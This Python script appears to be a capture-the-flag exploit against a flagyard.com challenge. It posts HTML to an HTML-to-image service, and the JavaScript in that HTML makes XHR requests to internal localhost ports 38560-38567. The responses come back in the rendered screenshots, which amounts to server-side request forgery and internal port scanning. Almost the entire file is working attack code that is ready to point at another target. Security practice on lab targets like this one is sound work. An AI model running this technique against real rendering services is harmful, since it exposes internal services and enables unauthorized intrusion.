import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(2):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=60)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/p1_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes OK')
                return True
            print(f'{name}: [{r.status_code}] {r.text[:120]}')
            return False
        except Exception as e:
            time.sleep(2)
    return False

# One port per call. Use async XHR with timeout, render waits via a spin using synchronous
# but with a guard. Simplest: async fetch, then block ~2s with a busy setTimeout replaced by
# writing result and letting the screenshot pipeline capture after settle.
def probe(port):
    return f'''<!doctype html><html><head><style>body{{font-family:monospace;font-size:16px;padding:10px}}</style></head><body><div id=o>PROBING {port}</div><script>
var x=new XMLHttpRequest();
x.timeout=4000;
try{{
  x.open("GET","http://localhost:{port}/status",false);
  x.send();
  document.getElementById('o').textContent="{port} LIVE "+x.status+" "+x.responseText.substring(0,120);
}}catch(e){{document.getElementById('o').textContent="{port} DEAD "+e;}}
</script></body></html>'''

for port in range(38560, 38568):
    ok = render(probe(port), f'port{port}')
    time.sleep(1)
